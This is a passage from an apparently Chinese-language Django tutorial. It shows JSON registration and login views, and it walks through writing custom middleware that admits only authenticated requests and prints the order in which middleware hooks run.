        <span style="color: #a0522d;">username</span>=payload[<span style="color: #8b2252;">'username'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = authenticate(username=username, password=password)
        <span style="color: #a020f0;">if</span> user:<span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;&#25143;&#21517;&#23494;&#30721;&#27491;&#30830;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">User</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user),request.user) <span style="color: #b22222;"># </span><span style="color: #b22222;">AnonymousUser</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> JsonResponse (Messages.INVALID_USERNAME_OFR_PASSWORD)
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.INVALID_USERNAME_OFR_PASSWORD)
</pre>
</div>

<p>
以后的业务方法中，有些业务方法要求用户登录后才可以访问，如何做到：
</p>
<ol class="org-ol">
<li>@login_required装饰器</li>
<li>中间件技术</li>
<li>自定义装饰器</li>
</ol>

<p>
@login_required装饰器，但是它会在服务器端重定向。我们这次是前后端分离，需要后端返回状态值，是由前端路由实现跳转。所以此装饰器不适合。
</p>

<p>
范例
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/urls.py</span>
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> reg, user_login

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, reg), <span style="color: #b22222;"># </span><span style="color: #b22222;">reg POST /users/</span>
    path(<span style="color: #8b2252;">'login'</span>, user_login), <span style="color: #b22222;"># </span><span style="color: #b22222;">Post /users/login</span>
]
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/views.py</span>
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render, HttpResponse
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponseBadRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate, login, logout
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_POST, require_GET, require_http_methods
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.core.handlers.wsgi import WSGIRequest</span>

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.GET)  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;</span>
    <span style="color: #483d8b;">print</span>(request.POST) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#21333;&#25552;&#20132;</span>
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_login</span>(request:HttpRequest):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36827;&#20837;&#21040;&#35270;&#22270;&#20989;&#25968;&#20013;&#65292;request&#20013;&#24212;&#35813;&#26377;2&#20010;&#21160;&#24577;&#22686;&#21152;&#30340;&#23646;&#24615;&#65292;session&#12289;user, &#21644;&#20013;&#38388;&#20214;&#26377;&#20851;</span>
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #483d8b;">print</span>()
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload) <span style="color: #b22222;">#</span><span style="color: #b22222;">dict</span>
        <span style="color: #a0522d;">username</span> = payload[<span style="color: #8b2252;">'username'</span>] <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;  &#35813;&#22914;&#20309;&#22788;&#29702;&#65311;</span>
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35748;&#35777;&#20989;&#25968;&#65292;&#35299;&#20915;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;&#21305;&#37197;&#38382;&#39064;&#65292;&#21305;&#37197;&#25104;&#21151;&#21644;&#25968;&#25454;&#24211;&#35760;&#24405;&#19968;&#19968;&#23545;&#24212;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30495;&#23454;&#23384;&#22312;&#30340;&#29992;&#25143;&#65292;is_authenticated&#27704;&#36828;&#20026;true</span>
        <span style="color: #a0522d;">user</span> = authenticate(username=username, password=password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user), request.user)  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30446;&#21069;&#26159;&#21311;&#21517;&#30340;&#12290;&#21311;&#21517;&#29992;&#25143;&#20063;&#26159;&#29992;&#25143;&#65292;&#20294;is_authenticated&#27704;&#36828;&#20026;false</span>
        <span style="color: #483d8b;">print</span>(request.session)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
        <span style="color: #a020f0;">if</span> user:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">cookie&#21644;session&#65292;&#39318;&#20808;&#20320;&#24517;&#39035;&#23545;&#35748;&#35777;&#25104;&#21151;&#32773;&#21457;&#19968;&#20010;&#36523;&#20221;id&#65292;response&#20013;&#22686;&#21152;set-cookie</span>
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33267;&#23569;&#24212;&#35813;&#26377;sessionID&#65292;sessionID&#24517;&#39035;&#20445;&#23384;&#22312;&#26381;&#21153;&#22120;&#31471;</span>
            login(request, user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21508;&#31181;&#21518;&#21488;jsp, php&#37117;&#20064;&#24815;&#36890;&#36807;request.session&#21462;session&#20540;&#65307;user&#32465;&#23450;&#21040;request&#19978;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user)
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user), request.user)
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=*'</span>*30)
            <span style="color: #a0522d;">response</span> = HttpResponse(status=204)
            <span style="color: #b22222;"># </span><span style="color: #b22222;">response.set_cookie('xxx')</span>

            <span style="color: #a020f0;">return</span> HttpResponse(status=204) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#25143;&#39564;&#35777;&#25104;&#21151;&#65292;&#20043;&#21518;&#24590;&#20040;&#22788;&#29702;&#65311;</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.INVALID_USERNAME_OR_PASSWORD, status=200)
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:964b4cb1-25b3-449b-b48e-e638bda86f53" class="outline-3">
<h3 id="h:964b4cb1-25b3-449b-b48e-e638bda86f53">中间件技术Middleware</h3>
<div class="outline-text-3" id="text-h:964b4cb1-25b3-449b-b48e-e638bda86f53">
<p>
官方定义，在Django的request和response处理过程中，由框架提供的hook钩子
</p>

<p>
中间技术在1.10后发生了改变，可以使用新的方式定义。
</p>

<p>
参考: <a href="https://docs.djangoproject.com/en/5.2/topics/http/middleware/#writing-your-own-middleware">https://docs.djangoproject.com/en/5.2/topics/http/middleware/#writing-your-own-middleware</a>
</p>
</div>
<div id="outline-container-h:d0315c98-1f5b-4069-9db6-58afe668c251" class="outline-4">
<h4 id="h:d0315c98-1f5b-4069-9db6-58afe668c251">原理</h4>
<div class="outline-text-4" id="text-h:d0315c98-1f5b-4069-9db6-58afe668c251">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27979;&#35797;&#20195;&#30721;&#28155;&#21152;&#22312;user/views.py</span>

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">SimpleMiddleware1</span>:
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>,get_response):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">get_response</span> = get_response
        <span style="color: #b22222;"># </span><span style="color: #b22222;">One-time configuration and initialization.</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__call__</span>(<span style="color: #a020f0;">self</span>,request):
        <span style="color: #b22222;"># </span><span style="color: #b22222;">Conde to be executed for each request before</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">the view (and later middleware) are called.</span>
        <span style="color: #483d8b;">print</span>(1,<span style="color: #8b2252;">'- '</span>*30)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">isinstance</span>(request,HttpRequest))
        <span style="color: #483d8b;">print</span>(request.GET)
        <span style="color: #483d8b;">print</span>(request.POST)
        <span style="color: #483d8b;">print</span>(request.body)

        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20043;&#21069;&#30456;&#24403;&#20110;&#32769;&#26495;&#26412;&#30340;process_request</span>
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(b'',status = 404)</span>

        <span style="color: #a0522d;">response</span> = <span style="color: #a020f0;">self</span>.get_response(request)

        <span style="color: #b22222;">#</span><span style="color: #b22222;">Code to be executed for each request/response after</span>
        <span style="color: #b22222;">#</span><span style="color: #b22222;">the view is called.</span>
        <span style="color: #483d8b;">print</span>(101,<span style="color: #8b2252;">'- '</span>* 30)
        <span style="color: #a020f0;">return</span>  response

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">process_view</span>(<span style="color: #a020f0;">self</span>,request,view_func,view_args,view_kwargs):
        <span style="color: #483d8b;">print</span>(2,<span style="color: #8b2252;">"-"</span> * 30)
        <span style="color: #483d8b;">print</span>(view_func.<span style="color: #483d8b;">__name__</span>,view_args,view_kwargs)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35266;&#23519;view_func&#21517;&#23383;&#65292;&#35828;&#26126;&#22312;process_request&#20043;&#21518;,process_view&#20043;&#21069;&#24050;&#32463;&#20570;&#22909;&#20102;&#36335;&#24452;&#26144;&#23556;</span>
        <span style="color: #a020f0;">return</span>  <span style="color: #008b8b;">None</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32487;&#32493;&#25191;&#34892;&#20854;&#20182;&#30340;process_view&#25110;view</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">return HttpResponse("111",status=201)</span>
</pre>
</div>

<ul class="org-ul">
<li>修改=blog/settings.py=文件，添加消息中间件</li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;blog/settings.py&#25991;&#20214;&#65292;&#28155;&#21152;&#28040;&#24687;&#20013;&#38388;&#20214;</span>

<span style="color: #a0522d;">MIDDLEWARE</span> = [
    ...,
    <span style="color: #8b2252;">'user.views.SimpleMiddleware1'</span>, <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22686;&#21152;&#35813;&#20013;&#38388;&#20214;</span>
]
</pre>
</div>

<p>
运行上面的代码，可以后到，先执行了get_response之前的代码，然后调用了get_response，再调用view，之后执行了get_response之后的代码。
</p>


<p>
示例：全局做中间件，所有请求后过中间件，不推荐
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">settings.py</span>
<span style="color: #a0522d;">MIDDLEWARE</span> = [
    <span style="color: #8b2252;">'django.middleware.security.SecurityMiddleware'</span>,
    <span style="color: #8b2252;">'django.contrib.sessions.middleware.SessionMiddleware'</span>,
    <span style="color: #8b2252;">'django.middleware.common.CommonMiddleware'</span>,
    <span style="color: #b22222;"># </span><span style="color: #b22222;">'django.middleware.csrf.CsrfViewMiddleware',</span>
    <span style="color: #8b2252;">'django.contrib.auth.middleware.AuthenticationMiddleware'</span>,
    <span style="color: #8b2252;">'django.contrib.messages.middleware.MessageMiddleware'</span>,
    <span style="color: #8b2252;">'django.middleware.clickjacking.XFrameOptionsMiddleware'</span>,
    <span style="color: #8b2252;">'user.views.SimpleMiddleware1'</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20840;&#23616;&#36807;&#28388;</span>
]
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/urls.py</span>
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> reg, user_login, user_logout

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, reg),
    path(<span style="color: #8b2252;">'login'</span>, user_login),
    path(<span style="color: #8b2252;">'logout'</span>, user_logout),
]
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">user/views.py</span>
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponse, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate, login, logout
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_GET, require_POST, require_http_methods
<span style="color: #a020f0;">from</span> django.contrib.auth.decorators <span style="color: #a020f0;">import</span> login_required
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.GET)  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;</span>
    <span style="color: #483d8b;">print</span>(request.POST) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#21333;&#25552;&#20132;</span>
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_login</span>(request:HttpRequest):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36827;&#20837;&#21040;&#35270;&#22270;&#20989;&#25968;&#20013;&#65292;request&#20013;&#24212;&#35813;&#26377;2&#20010;&#21160;&#24577;&#22686;&#21152;&#30340;&#23646;&#24615;&#65292;session&#12289;user, &#21644;&#20013;&#38388;&#20214;&#26377;&#20851;</span>
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #483d8b;">print</span>()
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload) <span style="color: #b22222;">#</span><span style="color: #b22222;">dict</span>
        <span style="color: #a0522d;">username</span> = payload[<span style="color: #8b2252;">'username'</span>] <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;  &#35813;&#22914;&#20309;&#22788;&#29702;&#65311;</span>
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35748;&#35777;&#20989;&#25968;&#65292;&#35299;&#20915;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;&#21305;&#37197;&#38382;&#39064;&#65292;&#21305;&#37197;&#25104;&#21151;&#21644;&#25968;&#25454;&#24211;&#35760;&#24405;&#19968;&#19968;&#23545;&#24212;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30495;&#23454;&#23384;&#22312;&#30340;&#29992;&#25143;&#65292;is_authenticated&#27704;&#36828;&#20026;true</span>
        <span style="color: #a0522d;">user</span> = authenticate(username=username, password=password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user), request.user)  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30446;&#21069;&#26159;&#21311;&#21517;&#30340;&#12290;&#21311;&#21517;&#29992;&#25143;&#20063;&#26159;&#29992;&#25143;&#65292;&#20294;is_authenticated&#27704;&#36828;&#20026;false</span>
        <span style="color: #483d8b;">print</span>(request.session)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
        <span style="color: #a020f0;">if</span> user:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">cookie&#21644;session&#65292;&#39318;&#20808;&#20320;&#24517;&#39035;&#23545;&#35748;&#35777;&#25104;&#21151;&#32773;&#21457;&#19968;&#20010;&#36523;&#20221;id&#65292;response&#20013;&#22686;&#21152;set-cookie</span>
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33267;&#23569;&#24212;&#35813;&#26377;sessionID&#65292;sessionID&#24517;&#39035;&#20445;&#23384;&#22312;&#26381;&#21153;&#22120;&#31471;</span>
            login(request, user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21508;&#31181;&#21518;&#21488;jsp, php&#37117;&#20064;&#24815;&#36890;&#36807;request.session&#21462;session&#20540;&#65307;user&#32465;&#23450;&#21040;request&#19978;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user)
            <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(request.user), request.user)
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=*'</span>*30)
            <span style="color: #a0522d;">response</span> = HttpResponse(status=204)
            <span style="color: #b22222;"># </span><span style="color: #b22222;">response.set_cookie('xxx')</span>
            <span style="color: #a020f0;">return</span> HttpResponse(status=204) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#25143;&#39564;&#35777;&#25104;&#21151;&#65292;&#20043;&#21518;&#24590;&#20040;&#22788;&#29702;&#65311;</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.INVALID_USERNAME_OR_PASSWORD, status=200)
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required  # &#31561;&#20215;&#20110; user_logout = login_required(user_logout)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required(login_url='users/login') # &#31561;&#20215;&#20110; user_logout = login_required(login_url='users/login')(user_logout)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_logout</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'^^^^ view function user_logout'</span>)
    <span style="color: #483d8b;">print</span>(request.user)
    <span style="color: #483d8b;">print</span>(request.user.<span style="color: #483d8b;">__dict__</span>)
    <span style="color: #a020f0;">if</span> request.user.is_authenticated:
        <span style="color: #a0522d;">s</span> = 200
    <span style="color: #a020f0;">else</span>:
        <span style="color: #a0522d;">s</span> = 400
    <span style="color: #a020f0;">return</span> JsonResponse({}, status=s)

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">SimpleMiddleware1</span>:
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>, get_response):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">get_response</span> = get_response
        <span style="color: #b22222;"># </span><span style="color: #b22222;">One-time configuration and initialization.</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__call__</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #b22222;"># </span><span style="color: #b22222;">Code to be executed for each request before</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">the view (and later middleware) are called.</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27599;&#19968;&#20010;&#20013;&#38388;&#20214;&#36820;&#22238;response&#20043;&#21069;&#35843;&#29992;&#65292;&#20570;request&#22788;&#29702;</span>
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=-'</span>*30)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware1 before response'</span>)
        <span style="color: #483d8b;">print</span>(request.session.items())
        <span style="color: #483d8b;">print</span>(request.user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20320;&#22312;&#35748;&#35777;&#20013;&#38388;&#20214;&#20043;&#21518; </span>
        <span style="color: #a020f0;">if</span> request.user.is_authenticated:
            <span style="color: #a0522d;">response</span> = <span style="color: #a020f0;">self</span>.get_response(request) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35843;&#29992;&#19979;&#19968;&#20010;</span>

            <span style="color: #b22222;"># </span><span style="color: #b22222;">Code to be executed for each request/response after</span>
            <span style="color: #b22222;"># </span><span style="color: #b22222;">the view is called.</span>
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21487;&#33021;&#23545;request&#21644;response&#20570;&#22788;&#29702;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'SimpleMiddleware1 after response'</span>)
            <span style="color: #483d8b;">print</span>(response)
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=~'</span>*30)

            <span style="color: #a020f0;">return</span> response
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'&#25552;&#21069;&#32467;&#26463;&#20102;'</span>, status=401)
</pre>
</div>


<p>
示例2: 了解执行顺序, 洋葱式，依次执行
</p>
<ul class="org-ul">
<li>M1 process_request</li>
<li>M2 process_request</li>
<li>M1 process_views</li>
<li>M2 process_views</li>
<li>view function 视图函数</li>
<li>M2 process_response</li>
<li>M1 process_response</li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">user/vews.py</span>
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponse, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate, login, logout
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_GET, require_POST, require_http_methods
<span style="color: #a020f0;">from</span> django.contrib.auth.decorators <span style="color: #a020f0;">import</span> login_required
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(request.path)
    <span style="color: #483d8b;">print</span>(request.GET)  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;</span>
    <span style="color: #483d8b;">print</span>(request.POST) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#21333;&#25552;&#20132;</span>
    <span style="color: #483d8b;">print</span>(request.method)
    <span style="color: #483d8b;">print</span>(request.body)
    <span style="color: #483d8b;">print</span>(request.content_type) <span style="color: #b22222;">#</span><span style="color: #b22222;">application/json</span>
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
